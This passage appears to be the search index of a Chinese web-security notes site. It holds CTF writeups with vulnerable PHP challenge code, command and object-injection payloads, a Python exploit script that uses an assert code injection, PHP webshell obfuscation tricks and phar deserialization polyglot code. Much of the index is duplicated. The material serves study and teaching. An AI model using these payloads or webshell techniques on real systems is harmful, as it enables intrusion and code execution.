php\u4e0d\u9002\u7528\u6570\u5b57\uff0c\u5b57\u6bcd\u4e0b\u5212\u7ebf\u5199shell","title":"Webshell\u6784\u9020"},{"location":"web_sec/audit/webshell\u6784\u9020/#webshell","text":"","title":"Webshell\u6784\u9020"},{"location":"web_sec/audit/webshell\u6784\u9020/#_1","text":"1 2 3 4 php > $a = \"`{{{\"; php > $b = \"?<>/\"; php > var_dump($a^$b); string(4) \"_GET\" \u8fd9\u91cc\u4e5f\u6709\u4e00\u79cd\u7b80\u77ed\u7684\u5199\u6cd5 ${~\"\\xa0\\xb8\\xba\\xab\"} \u5b83\u7b49\u4e8e $_GET","title":"\u5f02\u6216\u65b9\u6cd5"},{"location":"web_sec/audit/webshell\u6784\u9020/#_2","text":"'a'++ => 'b'\uff0c'b'++ => 'c'\uff0c\u6211\u4eec\u53ea\u8981\u80fd\u62ff\u5230\u4e00\u4e2a\u53d8\u91cf\uff0c\u5176\u503c\u4e3aa\uff0c\u901a\u8fc7\u81ea\u589e\u64cd\u4f5c\u5373\u53ef\u83b7\u5f97a-z\u4e2d\u6240\u6709\u5b57\u7b26\u3002 \u6570\u7ec4\uff08Array\uff09\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5c31\u662f\u5927\u5199A\uff0c\u800c\u4e14\u7b2c4\u4e2a\u5b57\u6bcd\u662f\u5c0f\u5199a\u3002\u5728PHP\u4e2d\uff0c\u5982\u679c\u5f3a\u5236\u8fde\u63a5\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u7684\u8bdd\uff0c\u6570\u7ec4\u5c06\u88ab\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\uff0c\u5176\u503c\u4e3aArray\u3002\u518d\u53d6\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97'A'\u3002 php\u4e0d\u9002\u7528\u6570\u5b57\uff0c\u5b57\u6bcd\u4e0b\u5212\u7ebf\u5199shell","title":"\u6570\u7ec4\u62fc\u63a5"},{"location":"web_sec/audit/\u4e00\u4e9b\u9898\u76ee\u8bb0\u5f55/","text":"example \u00b6 xnuca2019 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 <?php $files = scandir ( './' ); foreach ( $files as $file ) { if ( is_file ( $file )){ if ( $file !== \"index.php\" ) { unlink ( $file ); } } } include_once ( \"fl3g.php\" ); if ( ! isset ( $_GET [ 'content' ]) || ! isset ( $_GET [ 'filename' ])) { highlight_file ( __FILE__ ); die (); } $content = $_GET [ 'content' ]; if ( stristr ( $content , 'on' ) || stristr ( $content , 'html' ) || stristr ( $content , 'type' ) || stristr ( $content , 'flag' ) || stristr ( $content , 'upload' ) || stristr ( $content , 'file' )) { echo \"Hacker\" ; die (); } $filename = $_GET [ 'filename' ]; if ( preg_match ( \"/[^a-z\\.]/\" , $filename ) == 1 ) { echo \"Hacker\" ; die (); } $files = scandir ( './' ); foreach ( $files as $file ) { if ( is_file ( $file )){ if ( $file !== \"index.php\" ) { unlink ( $file ); } } } file_put_contents ( $filename , $content . \" \\n Just one chance\" ); ?> xnuca2018 ezdotso \u4e00\u9053\u73af\u5883\u914d\u7f6e\u9519\u8bef\u7684\u9898 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 <?php $param = array (); parse_str ( $_SERVER [ 'QUERY_STRING' ]); if ( isset ( $action )){ switch ( $action ){ case \"php_info\" : echo call_user_func_array ( \"php_info\" , $param ); break ; case \"cmd\" : if ( isset ( $cmd )){ if ( is_string ( $cmd )){ if ( strlen ( $cmd ) > 9 ){ die (); } $pat1 = \"/[^0-9a-zA-Z \\/\\*]/\" ; if ( preg_match ( $pat1 , $cmd ) > 0 ){ die (); } $pat2 = \"/^[a-zA-Z]+ [0-9a-zA-Z\\/\\*]+$/\" ; if ( preg_match ( $pat2 , $cmd ) == 0 ){ die (); } system ( \"busybox \" . $cmd ); } } break ; default : echo call_user_func_array ( \"hello\" , $param ); break ; } } else { show_source ( __FILE__ ); } payload: action=cmd&cmd=cat%20/flag ISITDTU2019 EasyPHP \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 <?php highlight_file ( __FILE__ ); $_ = @ $_GET [ '_' ]; if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $_ ) ) die ( 'ros\u00e9 will not do it' ); if ( strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd ) die ( 'you are so close, omg' ); eval ( $_ ); ?> 1 2 3 <?php $a = !!@ i ; echo $a ; // produces boolean(true) 1 2 <?php echo ( !!@ i + !!@ i ) ** ( !!@ i + !!@ i + !!@ i + !!@ i ); //outputs 2^4 = 16 Hack.lu 2018 babyphp \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 <?php require_once ( 'flag.php' ); error_reporting ( 0 ); if ( ! isset ( $_GET [ 'msg' ])){ highlight_file ( __FILE__ ); die (); } @ $msg = $_GET [ 'msg' ]; if ( @ file_get_contents ( $msg ) !== \"Hello Challenge!\" ){ die ( 'Wow so rude!!!!1' ); } echo \"Hello Hacker! Have a look around. \\n \" ; @ $k1 = $_GET [ 'key1' ]; @ $k2 = $_GET [ 'key2' ]; $cc = 1337 ; $bb = 42 ; if ( intval ( $k1 ) !== $cc || $k1 === $cc ){ die ( \"lol no \\n \" ); } if ( strlen ( $k2 ) == $bb ){ if ( preg_match ( '/^\\d+\uff04/' , $k2 ) && ! is_numeric ( $k2 )){ if ( $k2 == $cc ){ @ $cc = $_GET [ 'cc' ]; } } } list ( $k1 , $k2 ) = [ $k2 , $k1 ]; if ( substr ( $cc , $bb ) === sha1 ( $cc )){ foreach ( $_GET as $lel => $hack ){ $$lel = $hack ; } } $\u202eb = \"2\" ; $a = \"\u202eb\" ; //;1=b if ( $$a !== $k1 ){ die ( \"lel no \\n \" ); } // plz die now assert_options ( ASSERT_BAIL , 1 ); assert ( \" $bb == $cc \" ); echo \"Good Job ;)\" ; // TODO // echo $flag; \u5e08\u5085\u7ed9\u4e86exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #!/usr/bin/env python2 import requests import urllib import base64 # flag{7c217708c5293a3264bb136ef1fadd6e} params = { # we can provide a data: url to file_get_contents 'msg' : 'data://text/plain;base64,{}' . format ( base64 . b64encode ( 'Hello Challenge!' )), 'key1' : 1337 , # the dollar sing is NOT actually the $ 'key2' : '0' * 35 + '1337 \\xef\\xbc\\x84 ' , # if we provide an array, both substr and sha1 return null 'cc[]' : '' , # we can override k1 with using \"$$len = $hack\" 'k1' : '2' , # assert evaluates the string which results in code injection 'bb' : 'print $flag.\" \\\\ n\"; //' } url = 'https://arcade.fluxfingers.net:1819/?{}' . format ( urllib . urlencode ( params )) with requests . get ( url ) as r : print r . text WPI-CTF2019 \u00b6 1. getaflag 1 2 3 Come on down and get your flag, all you have to do is enter the correct password ... http://getaflag.wpictf.xyz:31337/ (or 31338 or 31339) The challenge required us to guess the correct password. Upon inspecting the source of the page, I found a commented out encrpted key: The trailing == suggest that it is a base64 encoding, so after decrypting it, I found the message: Hey Goutham, don't forget to block /auth.php after you upload this challenge ;) That lead me to /auth.php page which contained the hints to solve this challenge. The page contained the following pseudo code: 1 2 3 4 5 6 7 8 9 10 11 12 // Pseudocode $passcode = '???'; $flag = '????' extract($_GET); if (($input is detected)) { if ($input === get_contents($passcode)) { return $flag } else { echo \"Invalid ... Please try again!\" } } This hint shows us how the authentication works. So by manipulating the data sent to the website, I passed empty value for input and passcode which resulted in the comparison to be successful, resulting it in showing the flag. The URL was passed onto auth.php as follows: 1 http://getaflag.wpictf.xyz:31337/?input=&passcode= The leads to the success page, but the flag itself is outputted as a console.log() command using JavaScript. So I had to open the browser console to get the flag. 1 Flag: WPI{1_l0v3_PHP} b00t2root \u201919 CTF \u00b6 payload: <http://3.16.68.122/Easy-php/?1=0e9028856416420525&2%5Ba%5D=&3%5Bb%5D=&4=O:7:%22Secrets%22:2:{s:4:%22flag%22;N;s:4:%22temp%22;R:2>;} moctf \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 <?php show_source ( __FILE__ ); $c = \"<?php exit;?>\" ; @ $c .= $_POST [ 'c' ]; @ $filename = $_POST [ 'file' ]; if ( ! isset ( $filename )) { file_put_contents ( 'tmp.php' , '' ); } @ file_put_contents ( $filename , $c ); include ( 'tmp.php' ); ?>","title":"example"},{"location":"web_sec/audit/\u4e00\u4e9b\u9898\u76ee\u8bb0\u5f55/#example","text":"xnuca2019 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 <?php $files = scandir ( './' ); foreach ( $files as $file ) { if ( is_file ( $file )){ if ( $file !== \"index.php\" ) { unlink ( $file ); } } } include_once ( \"fl3g.php\" ); if ( ! isset ( $_GET [ 'content' ]) || ! isset ( $_GET [ 'filename' ])) { highlight_file ( __FILE__ ); die (); } $content = $_GET [ 'content' ]; if ( stristr ( $content , 'on' ) || stristr ( $content , 'html' ) || stristr ( $content , 'type' ) || stristr ( $content , 'flag' ) || stristr ( $content , 'upload' ) || stristr ( $content , 'file' )) { echo \"Hacker\" ; die (); } $filename = $_GET [ 'filename' ]; if ( preg_match ( \"/[^a-z\\.]/\" , $filename ) == 1 ) { echo \"Hacker\" ; die (); } $files = scandir ( './' ); foreach ( $files as $file ) { if ( is_file ( $file )){ if ( $file !== \"index.php\" ) { unlink ( $file ); } } } file_put_contents ( $filename , $content . \" \\n Just one chance\" ); ?> xnuca2018 ezdotso \u4e00\u9053\u73af\u5883\u914d\u7f6e\u9519\u8bef\u7684\u9898 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 <?php $param = array (); parse_str ( $_SERVER [ 'QUERY_STRING' ]); if ( isset ( $action )){ switch ( $action ){ case \"php_info\" : echo call_user_func_array ( \"php_info\" , $param ); break ; case \"cmd\" : if ( isset ( $cmd )){ if ( is_string ( $cmd )){ if ( strlen ( $cmd ) > 9 ){ die (); } $pat1 = \"/[^0-9a-zA-Z \\/\\*]/\" ; if ( preg_match ( $pat1 , $cmd ) > 0 ){ die (); } $pat2 = \"/^[a-zA-Z]+ [0-9a-zA-Z\\/\\*]+$/\" ; if ( preg_match ( $pat2 , $cmd ) == 0 ){ die (); } system ( \"busybox \" . $cmd ); } } break ; default : echo call_user_func_array ( \"hello\" , $param ); break ; } } else { show_source ( __FILE__ ); } payload: action=cmd&cmd=cat%20/flag","title":"example"},{"location":"web_sec/audit/\u4e00\u4e9b\u9898\u76ee\u8bb0\u5f55/#isitdtu2019-easyphp","text":"1 2 3 4 5 6 7 8 9 10 11 12 <?php highlight_file ( __FILE__ ); $_ = @ $_GET [ '_' ]; if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $_ ) ) die ( 'ros\u00e9 will not do it' ); if ( strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd ) die ( 'you are so close, omg' ); eval ( $_ ); ?> 1 2 3 <?php $a = !!@ i ; echo $a ; // produces boolean(true) 1 2 <?php echo ( !!@ i + !!@ i ) ** ( !!@ i + !!@ i + !!@ i + !!@ i ); //outputs 2^4 = 16","title":"ISITDTU2019 EasyPHP"},{"location":"web_sec/audit/\u4e00\u4e9b\u9898\u76ee\u8bb0\u5f55/#hacklu-2018-babyphp","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 <?php require_once ( 'flag.php' ); error_reporting ( 0 ); if ( ! isset ( $_GET [ 'msg' ])){ highlight_file ( __FILE__ ); die (); } @ $msg = $_GET [ 'msg' ]; if ( @ file_get_contents ( $msg ) !== \"Hello Challenge!\" ){ die ( 'Wow so rude!!!!1' ); } echo \"Hello Hacker! Have a look around. \\n \" ; @ $k1 = $_GET [ 'key1' ]; @ $k2 = $_GET [ 'key2' ]; $cc = 1337 ; $bb = 42 ; if ( intval ( $k1 ) !== $cc || $k1 === $cc ){ die ( \"lol no \\n \" ); } if ( strlen ( $k2 ) == $bb ){ if ( preg_match ( '/^\\d+\uff04/' , $k2 ) && ! is_numeric ( $k2 )){ if ( $k2 == $cc ){ @ $cc = $_GET [ 'cc' ]; } } } list ( $k1 , $k2 ) = [ $k2 , $k1 ]; if ( substr ( $cc , $bb ) === sha1 ( $cc )){ foreach ( $_GET as $lel => $hack ){ $$lel = $hack ; } } $\u202eb = \"2\" ; $a = \"\u202eb\" ; //;1=b if ( $$a !== $k1 ){ die ( \"lel no \\n \" ); } // plz die now assert_options ( ASSERT_BAIL , 1 ); assert ( \" $bb == $cc \" ); echo \"Good Job ;)\" ; // TODO // echo $flag; \u5e08\u5085\u7ed9\u4e86exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #!/usr/bin/env python2 import requests import urllib import base64 # flag{7c217708c5293a3264bb136ef1fadd6e} params = { # we can provide a data: url to file_get_contents 'msg' : 'data://text/plain;base64,{}' . format ( base64 . b64encode ( 'Hello Challenge!' )), 'key1' : 1337 , # the dollar sing is NOT actually the $ 'key2' : '0' * 35 + '1337 \\xef\\xbc\\x84 ' , # if we provide an array, both substr and sha1 return null 'cc[]' : '' , # we can override k1 with using \"$$len = $hack\" 'k1' : '2' , # assert evaluates the string which results in code injection 'bb' : 'print $flag.\" \\\\ n\"; //' } url = 'https://arcade.fluxfingers.net:1819/?{}' . format ( urllib . urlencode ( params )) with requests . get ( url ) as r : print r . text","title":"Hack.lu 2018 babyphp"},{"location":"web_sec/audit/\u4e00\u4e9b\u9898\u76ee\u8bb0\u5f55/#wpi-ctf2019","text":"1. getaflag 1 2 3 Come on down and get your flag, all you have to do is enter the correct password ... http://getaflag.wpictf.xyz:31337/ (or 31338 or 31339) The challenge required us to guess the correct password. Upon inspecting the source of the page, I found a commented out encrpted key: The trailing == suggest that it is a base64 encoding, so after decrypting it, I found the message: Hey Goutham, don't forget to block /auth.php after you upload this challenge ;) That lead me to /auth.php page which contained the hints to solve this challenge. The page contained the following pseudo code: 1 2 3 4 5 6 7 8 9 10 11 12 // Pseudocode $passcode = '???'; $flag = '????' extract($_GET); if (($input is detected)) { if ($input === get_contents($passcode)) { return $flag } else { echo \"Invalid ... Please try again!\" } } This hint shows us how the authentication works. So by manipulating the data sent to the website, I passed empty value for input and passcode which resulted in the comparison to be successful, resulting it in showing the flag. The URL was passed onto auth.php as follows: 1 http://getaflag.wpictf.xyz:31337/?input=&passcode= The leads to the success page, but the flag itself is outputted as a console.log() command using JavaScript. So I had to open the browser console to get the flag. 1 Flag: WPI{1_l0v3_PHP}","title":"WPI-CTF2019"},{"location":"web_sec/audit/\u4e00\u4e9b\u9898\u76ee\u8bb0\u5f55/#b00t2root-19-ctf","text":"payload: <http://3.16.68.122/Easy-php/?1=0e9028856416420525&2%5Ba%5D=&3%5Bb%5D=&4=O:7:%22Secrets%22:2:{s:4:%22flag%22;N;s:4:%22temp%22;R:2>;}","title":"b00t2root \u201919 CTF"},{"location":"web_sec/audit/\u4e00\u4e9b\u9898\u76ee\u8bb0\u5f55/#moctf","text":"1 2 3 4 5 6 7 8 9 10 11 12 <?php show_source ( __FILE__ ); $c = \"<?php exit;?>\" ; @ $c .= $_POST [ 'c' ]; @ $filename = $_POST [ 'file' ]; if ( ! isset ( $filename )) { file_put_contents ( 'tmp.php' , '' ); } @ file_put_contents ( $filename , $c ); include ( 'tmp.php' ); ?>","title":"moctf"},{"location":"web_sec/audit/\u5229\u7528phar\u6269\u5c55php\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e/","text":"\u5229\u7528phar\u534f\u8bae\u6269\u5c55PHP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u653b\u51fb\u9762 \u00b6 phar\u6587\u4ef6\u7ed3\u6784 \u00b6 1. a stub \u00b6 \u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u6807\u5fd7\uff0c\u683c\u5f0f\u4e3a xxx<?php xxx; __HALT_COMPILER();?> \uff0c\u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u4f46\u5fc5\u987b\u4ee5 __HALT_COMPILER();?> \u6765\u7ed3\u5c3e\uff0c\u5426\u5219phar\u6269\u5c55\u5c06\u65e0\u6cd5\u8bc6\u522b\u8fd9\u4e2a\u6587\u4ef6\u4e3aphar\u6587\u4ef6\u3002 2. a manifest describing the contents \u00b6 phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u90fd\u653e\u5728\u8fd9\u90e8\u5206\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5 \u5e8f\u5217\u5316 \u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\uff0c\u8fd9\u662f\u4e0a\u8ff0\u653b\u51fb\u624b\u6cd5\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002 3. \u6587\u4ef6\u5185\u5bb9 \u00b6 \u88ab\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\u3002 4. \u6587\u4ef6\u7b7e\u540d \u00b6 \u7b7e\u540d\uff0c\u653e\u5728\u6587\u4ef6\u672b\u5c3e\uff0c\u683c\u5f0f\u5982\u4e0b\uff1a demo \u00b6 \u8981\u5c06php.ini\u4e2d\u7684 phar.readonly \u9009\u9879\u8bbe\u7f6e\u4e3a Off \uff0c\u5426\u5219\u65e0\u6cd5\u751f\u6210phar\u6587\u4ef6\u3002 phar_gen.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <?php class TestObject { function __destruct () { echo \"hello prontosil\" ; } } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new TestObject (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> meta-data \u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7684\uff1a \u6709\u5e8f\u5217\u5316\u6570\u636e\u5fc5\u7136\u4f1a\u6709\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0cphp\u4e00\u5927\u90e8\u5206\u7684 \u6587\u4ef6\u7cfb\u7edf\u51fd\u6570 \u5728\u901a\u8fc7 phar:// \u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u6d4b\u8bd5\u540e\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5982\u4e0b\uff1a \u8bfb\u53d6phar\u6587\u4ef6\uff0c\u8c03\u7528\u9b54\u672f\u51fd\u6570 \u00b6 \u6784\u9020\u4e00\u4e2a readphar.php 1 2 3 4 5 6 7 8 9 <?php class TestObject { function __destruct () { echo \"hello prontosil\" ; } } $filename = 'phar://phar.phar/test.txt' ; file_get_contents ( $filename ); \u6ce8\u610f\u6211\u4eec\u9700\u8981\u4f7f\u7528 phar \u534f\u8bae\u8fdb\u884c\u8bfb\u53d6 \u7136\u540e\u5c31\u4f1a\u795e\u5947\u7684\u8c03\u7528 __destruct \u51fd\u6570\u4e86 \u5176\u5b9e\u4e0d\u53ea\u6709 file_get_contents \u51fd\u6570\uff0c file_exits \u51fd\u6570\u4e5f\u53ef\u4ee5\uff0c\u4e4b\u524d\u7684\u8868\u683c\u4e0a\u7684\u51fd\u6570\u90fd\u80fd\u6ee1\u8db3 \u8fd9\u6837\u6211\u4eec\u8fd8\u53ef\u4ee5\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php class TestObject { } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); $phar -> startBuffering (); $phar -> setStub ( \"GIF89a\" . \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub\uff0c\u589e\u52a0gif\u6587\u4ef6\u5934 $o = new TestObject (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> \u53c2\u8003 \u00b6 paper","title":"\u5229\u7528phar\u534f\u8bae\u6269\u5c55PHP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u653b\u51fb\u9762"},{"location":"web_sec/audit/\u5229\u7528phar\u6269\u5c55php\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e/#pharphp","text":"","title":"\u5229\u7528phar\u534f\u8bae\u6269\u5c55PHP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u653b\u51fb\u9762"},{"location":"web_sec/audit/\u5229\u7528phar\u6269\u5c55php\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e/#phar","text":"","title":"phar\u6587\u4ef6\u7ed3\u6784"},{"location":"web_sec/audit/\u5229\u7528phar\u6269\u5c55php\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e/#1-a-stub","text":"\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u6807\u5fd7\uff0c\u683c\u5f0f\u4e3a xxx<?php xxx; __HALT_COMPILER();?> \uff0c\u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u4f46\u5fc5\u987b\u4ee5 __HALT_COMPILER();?> \u6765\u7ed3\u5c3e\uff0c\u5426\u5219phar\u6269\u5c55\u5c06\u65e0\u6cd5\u8bc6\u522b\u8fd9\u4e2a\u6587\u4ef6\u4e3aphar\u6587\u4ef6\u3002","title":"1. a stub"},{"location":"web_sec/audit/\u5229\u7528phar\u6269\u5c55php\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e/#2-a-manifest-describing-the-contents","text":"phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u90fd\u653e\u5728\u8fd9\u90e8\u5206\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5 \u5e8f\u5217\u5316 \u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\uff0c\u8fd9\u662f\u4e0a\u8ff0\u653b\u51fb\u624b\u6cd5\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002","title":"2. a manifest describing the contents"},{"location":"web_sec/audit/\u5229\u7528phar\u6269\u5c55php\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e/#3","text":"\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\u3002","title":"3. \u6587\u4ef6\u5185\u5bb9"},{"location":"web_sec/audit/\u5229\u7528phar\u6269\u5c55php\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e/#4","text":"\u7b7e\u540d\uff0c\u653e\u5728\u6587\u4ef6\u672b\u5c3e\uff0c\u683c\u5f0f\u5982\u4e0b\uff1a","title":"4. \u6587\u4ef6\u7b7e\u540d"},{"location":"web_sec/audit/\u5229\u7528phar\u6269\u5c55php\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e/#demo","text":"\u8981\u5c06php.ini\u4e2d\u7684 phar.readonly \u9009\u9879\u8bbe\u7f6e\u4e3a Off \uff0c\u5426\u5219\u65e0\u6cd5\u751f\u6210phar\u6587\u4ef6\u3002 phar_gen.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <?php class TestObject { function __destruct () { echo \"hello prontosil\" ; } } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new TestObject (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> meta-data \u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7684\uff1a \u6709\u5e8f\u5217\u5316\u6570\u636e\u5fc5\u7136\u4f1a\u6709\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0cphp\u4e00\u5927\u90e8\u5206\u7684 \u6587\u4ef6\u7cfb\u7edf\u51fd\u6570 \u5728\u901a\u8fc7 phar:// \u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u6d4b\u8bd5\u540e\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5982\u4e0b\uff1a","title":"demo"},{"location":"web_sec/audit/\u5229\u7528phar\u6269\u5c55php\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e/#phar_1","text":"\u6784\u9020\u4e00\u4e2a readphar.php 1 2 3 4 5 6 7 8 9 <?php class TestObject { function __destruct () { echo \"hello prontosil\" ; } } $filename = 'phar://phar.phar/test.txt' ; file_get_contents ( $filename ); \u6ce8\u610f\u6211\u4eec\u9700\u8981\u4f7f\u7528 phar \u534f\u8bae\u8fdb\u884c\u8bfb\u53d6 \u7136\u540e\u5c31\u4f1a\u795e\u5947\u7684\u8c03\u7528 __destruct \u51fd\u6570\u4e86 \u5176\u5b9e\u4e0d\u53ea\u6709 file_get_contents \u51fd\u6570\uff0c file_exits \u51fd\u6570\u4e5f\u53ef\u4ee5\uff0c\u4e4b\u524d\u7684\u8868\u683c\u4e0a\u7684\u51fd\u6570\u90fd\u80fd\u6ee1\u8db3 \u8fd9\u6837\u6211\u4eec\u8fd8\u53ef\u4ee5\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php class TestObject { } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); $phar -> startBuffering (); $phar -> setStub ( \"GIF89a\" . \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub\uff0c\u589e\u52a0gif\u6587\u4ef6\u5934 $o = new TestObject (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?>","title":"\u8bfb\u53d6phar\u6587\u4ef6\uff0c\u8c03\u7528\u9b54\u672f\u51fd\u6570"},{"location":"web_sec/audit/\u5229\u7528phar\u6269\u5c55php\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e/#_1","text":"paper","title":"\u53c2\u8003"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/","text":"\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb \u00b6 1 2 3 4 > let obj = {}; <\u00b7 undefined > obj.__proto__; <\u00b7 {constructor: \u0192, __defineGetter__: \u0192, __defineSetter__: \u0192, hasOwnProperty: \u0192, __lookupGetter__: \u0192, \u2026} \u800c\u7ecf\u8fc7\u4e0d\u65ad\u7684\u8c03\u7528,\u6700\u7ec8\u7684\u539f\u578b\u5bf9\u8c61\u4f1a\u8c03\u7528\u5230null,\u8fd9\u5c06\u4f5c\u4e3a\u8be5\u539f\u578b\u94fe\u7684\u6700\u540e\u4e00\u4e2a\u73af\u8282,\u4e0e\u4e4b\u5bf9\u5e94\u7684,\u4f5c\u4e3a\u7ec8\u70b9\u7684null\u81ea\u7136\u4e5f\u662f\u6ca1\u6709\u539f\u578b\u5bf9\u8c61\u7684\u3002\u6bd4\u5982,\u6211\u4eec\u7ee7\u7eed\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u8c03\u7528\u5176\u539f\u578b\u5bf9\u8c61: obj. proto . proto ; <\u00b7 null 